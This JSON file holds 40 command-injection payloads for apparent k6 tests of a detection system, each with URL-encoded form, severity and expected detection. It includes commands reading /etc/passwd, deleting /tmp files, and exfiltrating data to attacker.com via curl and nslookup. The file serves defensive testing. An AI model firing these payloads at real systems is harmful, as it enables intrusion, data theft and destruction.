{
  "metadata": {
    "category": "cmdinj",
    "total_patterns": 40,
    "port": 8004,
    "description": "k6 test patterns for cmdinj"
  },
  "patterns": [
    {
      "id": "CMD_BASIC_SEMICOLON_001",
      "name": "Semicolon command separator with ls",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "; ls -la",
      "encoded": "%3B%20ls%20-la",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical"
    },
    {
      "id": "CMD_BASIC_002",
      "name": "AND operator with whoami",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "&& whoami",
      "encoded": "%26%26%20whoami",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical"
    },
    {
      "id": "CMD_BASIC_003",
      "name": "OR operator with id command",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "|| id",
      "encoded": "%7C%7C%20id",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical"
    },
    {
      "id": "CMD_BASIC_004",
      "name": "Background execution with ps",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "& ps aux",
      "encoded": "%26%20ps%20aux",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical"
    },
    {
      "id": "CMD_BASIC_005",
      "name": "Password file access attempt",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "; cat /etc/passwd",
      "encoded": "%3B%20cat%20/etc/passwd",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical"
    },
    {
      "id": "CMD_BASIC_006",
      "name": "System information gathering",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "; uname -a",
      "encoded": "%3B%20uname%20-a",
      "port": 8004,
      "expected_detection": true,
      "severity": "high"
    },
    {
      "id": "CMD_BASIC_007",
      "name": "Network information gathering",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "&& netstat -an",
      "encoded": "%26%26%20netstat%20-an",
      "port": 8004,
      "expected_detection": true,
      "severity": "high"
    },
    {
      "id": "CMD_BASIC_008",
      "name": "Kernel version information",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "|| cat /proc/version",
      "encoded": "%7C%7C%20cat%20/proc/version",
      "port": 8004,
      "expected_detection": true,
      "severity": "high"
    },
    {
      "id": "CMD_BASIC_009",
      "name": "Network interface configuration",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "; ifconfig",
      "encoded": "%3B%20ifconfig",
      "port": 8004,
      "expected_detection": true,
      "severity": "high"
    },
    {
      "id": "CMD_BASIC_010",
      "name": "Disk space information",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "&& df -h",
      "encoded": "%26%26%20df%20-h",
      "port": 8004,
      "expected_detection": true,
      "severity": "medium"
    },
    {
      "id": "CMD_BASIC_011",
      "name": "Basic pipe with id command",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "|id",
      "encoded": "%7Cid",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical"
    },
    {
      "id": "CMD_BASIC_012",
      "name": "Double pipe OR operator",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "||ls",
      "encoded": "%7C%7Cls",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical"
    },
    {
      "id": "CMD_BASIC_013",
      "name": "Semicolon with pwd command",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": ";pwd",
      "encoded": "%3Bpwd",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical"
    },
    {
      "id": "CMD_BASIC_014",
      "name": "Multiple semicolons injection",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": ";;ls",
      "encoded": "%3B%3Bls",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical"
    },
    {
      "id": "CMD_BASIC_015",
      "name": "AND operator with whoami",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "&& whoami",
      "encoded": "%26%26%20whoami",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical"
    },
    {
      "id": "CMD_BASIC_016",
      "name": "OR operator with id",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "|| id",
      "encoded": "%7C%7C%20id",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical"
    },
    {
      "id": "CMD_BASIC_017",
      "name": "Backtick command substitution",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "`id`",
      "encoded": "%60id%60",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical"
    },
    {
      "id": "CMD_BASIC_018",
      "name": "Dollar-paren command substitution",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "$(uname -a)",
      "encoded": "%24(uname%20-a)",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical"
    },
    {
      "id": "CMD_BASIC_019",
      "name": "URL encoded newline injection",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "%0als",
      "encoded": "%250als",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical"
    },
    {
      "id": "CMD_BASIC_020",
      "name": "CRLF injection with cat",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "%0d%0acat /etc/passwd",
      "encoded": "%250d%250acat%20%2Fetc%2Fpasswd",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical"
    },
    {
      "id": "CMD_BACK_001",
      "name": "File deletion via backticks",
      "category": "cmdinj",
      "subcategory": "backtick_execution",
      "payload": "`rm -rf /tmp/*`",
      "encoded": "%60rm%20-rf%20%2Ftmp%2F*%60",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical"
    },
    {
      "id": "CMD_BASH_001",
      "name": "Direct bash command execution",
      "category": "cmdinj",
      "subcategory": "bash_injection",
      "payload": "; /bin/bash -c 'whoami'",
      "encoded": "%3B%20%2Fbin%2Fbash%20-c%20'whoami'",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical"
    },
    {
      "id": "CMD_WIN_001",
      "name": "Windows directory listing",
      "category": "cmdinj",
      "subcategory": "windows_cmd",
      "payload": "& dir",
      "encoded": "%26%20dir",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical"
    },
    {
      "id": "CMD_PIPE_001",
      "name": "Password file piped to grep",
      "category": "cmdinj",
      "subcategory": "pipe_chaining",
      "payload": "cat /etc/passwd | grep root",
      "encoded": "cat%20%2Fetc%2Fpasswd%20%7C%20grep%20root",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical"
    },
    {
      "id": "CMD_ENC_001",
      "name": "URL encoded whoami command",
      "category": "cmdinj",
      "subcategory": "encoded_commands",
      "payload": "%3Bwhoami",
      "encoded": "%253Bwhoami",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical"
    },
    {
      "id": "CMD_BLIND_001",
      "name": "Time-based blind command injection",
      "category": "cmdinj",
      "subcategory": "blind_command_injection",
      "payload": "; sleep 10",
      "encoded": "%3B%20sleep%2010",
      "port": 8004,
      "expected_detection": true,
      "severity": "high",
      "expected_rule": "Command Injection via Semicolon"
    },
    {
      "id": "CMD_BLIND_002",
      "name": "Network-based time delay detection",
      "category": "cmdinj",
      "subcategory": "blind_command_injection",
      "payload": "&& ping -c 10 127.0.0.1",
      "encoded": "%26%26%20ping%20-c%2010%20127.0.0.1",
      "port": 8004,
      "expected_detection": true,
      "severity": "high",
      "expected_rule": "Advanced Command Injection Attempt"
    },
    {
      "id": "CMD_BLIND_003",
      "name": "Out-of-band data exfiltration via curl",
      "category": "cmdinj",
      "subcategory": "blind_command_injection",
      "payload": "| curl http://attacker.com/callback?data=`whoami`",
      "encoded": "%7C%20curl%20http%3A%2F%2Fattacker.com%2Fcallback%3Fdata%3D%60whoami%60",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "Command Injection via Pipe"
    },
    {
      "id": "CMD_BLIND_004",
      "name": "DNS-based data exfiltration",
      "category": "cmdinj",
      "subcategory": "blind_command_injection",
      "payload": "; nslookup `whoami`.attacker.com",
      "encoded": "%3B%20nslookup%20%60whoami%60.attacker.com",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "Command Injection via Semicolon"
    },
    {
      "id": "CMD_BLIND_005",
      "name": "Timeout-based command execution",
      "category": "cmdinj",
      "subcategory": "blind_command_injection",
      "payload": "&& timeout 15 bash",
      "encoded": "%26%26%20timeout%2015%20bash",
      "port": 8004,
      "expected_detection": true,
      "severity": "high",
      "expected_rule": "Advanced Command Injection Attempt"
    },
    {
      "id": "CMD_SUB_001",
      "name": "Command substitution with whoami",
      "category": "cmdinj",
      "subcategory": "command_substitution",
      "payload": "$(whoami)",
      "encoded": "%24%28whoami%29",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "Command Substitution Attack"
    },
    {
      "id": "CMD_SUB_002",
      "name": "Backtick command substitution with id",
      "category": "cmdinj",
      "subcategory": "command_substitution",
      "payload": "`id`",
      "encoded": "%60id%60",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "Command Substitution Attack"
    },
    {
      "id": "CMD_SUB_003",
      "name": "Password file via command substitution",
      "category": "cmdinj",
      "subcategory": "command_substitution",
      "payload": "$(cat /etc/passwd)",
      "encoded": "%24%28cat%20%2Fetc%2Fpasswd%29",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "Command Substitution Attack"
    },
    {
      "id": "CMD_SUB_004",
      "name": "System info via backtick substitution",
      "category": "cmdinj",
      "subcategory": "command_substitution",
      "payload": "`uname -a`",
      "encoded": "%60uname%20-a%60",
      "port": 8004,
      "expected_detection": true,
      "severity": "high",
      "expected_rule": "Command Substitution Attack"
    },
    {
      "id": "CMD_SUB_005",
      "name": "Root directory listing via substitution",
      "category": "cmdinj",
      "subcategory": "command_substitution",
      "payload": "$(ls -la /root)",
      "encoded": "%24%28ls%20-la%20%2Froot%29",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "Command Substitution Attack"
    },
    {
      "id": "CMD_ENC_002",
      "name": "URL encoded AND operator with ls",
      "category": "cmdinj",
      "subcategory": "encoded_commands",
      "payload": "%26%26%20ls%20-la",
      "encoded": "%2526%2526%2520ls%2520-la",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "Advanced Command Injection Attempt"
    },
    {
      "id": "CMD_ENC_003",
      "name": "Base64 encoded whoami command",
      "category": "cmdinj",
      "subcategory": "encoded_commands",
      "payload": "d2hvYW1p",
      "encoded": "d2hvYW1p",
      "port": 8004,
      "expected_detection": false,
      "severity": "critical",
      "expected_rule": "Advanced Command Injection Attempt"
    },
    {
      "id": "CMD_ENC_004",
      "name": "URL encoded command substitution",
      "category": "cmdinj",
      "subcategory": "encoded_commands",
      "payload": "%24%28whoami%29",
      "encoded": "%2524%2528whoami%2529",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "Advanced Command Injection Attempt"
    },
    {
      "id": "CMD_ENC_005",
      "name": "Hex encoded whoami command",
      "category": "cmdinj",
      "subcategory": "encoded_commands",
      "payload": "\\x77\\x68\\x6f\\x61\\x6d\\x69",
      "encoded": "%5Cx77%5Cx68%5Cx6f%5Cx61%5Cx6d%5Cx69",
      "port": 8004,
      "expected_detection": false,
      "severity": "critical",
      "expected_rule": "Advanced Command Injection Attempt"
    },
    {
      "id": "CMD_ENC_006",
      "name": "URL encoded backtick execution",
      "category": "cmdinj",
      "subcategory": "encoded_commands",
      "payload": "%60id%60",
      "encoded": "%2560id%2560",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "Advanced Command Injection Attempt"
    }
  ]
}
